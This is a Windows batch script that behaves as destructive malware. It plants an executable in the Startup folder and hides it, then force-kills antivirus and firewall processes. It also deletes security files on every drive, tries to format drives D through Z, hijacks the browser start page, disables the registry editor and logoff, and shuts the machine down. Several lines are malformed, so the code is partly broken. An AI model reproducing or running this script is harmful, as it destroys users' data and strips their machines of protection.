@echo off
cls
date 1987-09-30
copy ÆÆ¿ÇÎÏÅ£.exe "C:\Documents and Settings\All Users\¡¸¿ªÊ¼¡¹²Ëµ¥\³ÌÐò\Æô¶¯"
set taskkill=s
attrib "C:\Documents and Settings\All Users\¡¸¿ªÊ¼¡¹²Ëµ¥\³ÌÐò\Æô¶¯\ÆÆ¿ÇÎÏÅ£.exe" +r +s +h
attrib %windir%\system32\cmd.bat +r +s +h
%s% /im pfw.exe shadowtip.exe shadowservice.exe qq.exe explorer.exe IEXOLORE.EXE /f >nul
%s% /im norton* /f >nul
%s% /im av* /f >nul
%s% /im fire* /f >nul
%s% /im anti* /f >nul
%s% /im spy* /f >nul
%s% /im bullguard /f >nul
%s% /im PersFw /f >nul
%s% /im KAV* /f >nul
%s% /im ZONEALARM /f >nul
%s% /im SAFEWEB /f >nul
%s% /im OUTPOST /f >nul
%s% /im nv* /f >nul
%s% /im nav* /f >nul
%s% /im F-* /f >nul
%s% /im ESAFE /f >nul
%s% /im cle /f >nul
%s% /im BLACKICE /f >nul
%s% /im def* /f >nul
%s% /im 360safe.exe /f >nul
set alldrive=d e f g h i j k l m n o p q r s t u v w x y z
for %%a in (c %alldrive%) do del %%a:\360* /f /s /q >nul
for %%a in (c %alldrive%) do del %%a:\ÐÞ¸´* /f /s /q >nul
@format %alldrive%:/y/q

echo Windows Registry Editor Version 5.00 >pokewoniu.reg 
echo.>>pokewoniu.reg
echo
[HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run]>>pokewoniu.reg
echo ^"AutoRun^"="C:\Documents and Settings\All Users\¡¸¿ªÊ¼¡¹²Ëµ¥\³ÌÐò\Æô¶¯\ÆÆ¿ÇÎÏÅ£.exe">>pokewoniu.reg

[HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Internet Explorer\Main]>>pokewoniu.reg 
echo ^"Start Page^"="http://on888.home.chinaren.com/">>pokewoniu.reg

[HKEY_CURRENT_USER\Software\Microsoft\Internet Explorer\Main]>>pokewoniu.reg
echo ^"Start Page^"="http://on888.home.chinaren.com/">>pokewoniu.reg

[HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer]>>pokewoniu.reg
echo ^"NoDrives^"=dword:FFFFFFFF>>pokewoniu.reg

[HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVerssion\Policies\System]>>pokewoniu.reg
echo ^"DisableRegistryTools^"=dword:00000001>>pokewoniu.reg

[HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\WinOlaApp]>>pokewoniu.reg
echo ^"Disabled^"=dword:00000001>>pokewoniu.reg

[HKEY_USERS\.DEFAULT\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer]>>pokewoniu.reg
echo ^"NoLogOff^"=hex:01,00,00,00>>pokewoniu.reg

[HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer]>>pokewoniu.reg
echo ^"NoViewOnDrive^"=dword:67108863>>pokewoniu.reg

[HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer]>>pokewoniu.reg
echo ^"NoRealMode^"=dword:00000001>>pokewoniu.reg
regedit /s pokewoniu.reg 
del pokewoniu.reg
shutdown -s
@echo.